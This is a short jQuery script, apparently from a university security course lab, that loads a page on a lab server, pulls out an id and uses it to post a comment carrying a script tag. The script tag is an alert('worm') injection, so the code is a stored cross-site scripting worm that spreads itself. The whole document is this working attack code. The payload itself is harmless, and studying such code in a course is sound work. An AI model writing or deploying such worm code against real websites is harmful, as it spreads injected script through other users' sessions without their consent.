$.ajax({
    type: 'GET',
    url: 'http://csec380-core.csec.rit.edu:86/home.php',
    success: function ( data ) {
        var id = data.match(/\.php\?id=([0-9]+)"/i)[1];
        $.ajax({
            type: 'GET',
            url: `http://csec380-core.csec.rit.edu:86/add_comment.php?id=${id}&comment=<script>alert("worm")</script>`,
            success: function ( data ) {
            }
            });
    }
});
